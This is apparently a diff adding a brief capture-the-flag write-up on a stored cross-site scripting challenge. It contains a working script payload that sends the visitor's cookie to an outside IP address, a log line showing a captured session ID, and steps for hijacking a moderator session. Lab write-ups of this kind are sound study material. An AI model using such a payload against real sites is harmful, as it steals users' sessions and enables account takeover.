@@ -1,0 +1,19 @@
+Tried writing HTML code in the page - The page displayed as formatted => cross site scripting possible.
+
+wrote the code to get the user cookie:
+
+<script>
+location.href=("http://24.3.18.163:9999?c="+document.cookie)
+</script>
+
+By doing report to moderator, and seeing message, I can see that some kind of script will visit the reported page with moderators cookie.
+Ran a server on my system, and enabled port forwarding on the router.
+
+Once the request came, I got the cookie.
+2015-01-25 16:52:21.752 No mapping found matching URL /?c=PHPSESSID=vqmnmp5ofd7mv7l2eifdfpmv65
+
+vqmnmp5ofd7mv7l2eifdfpmv65
+
+Changed the cookie in browser to this cookie and got the flag.
+
+Server used: http://wiremock.org/
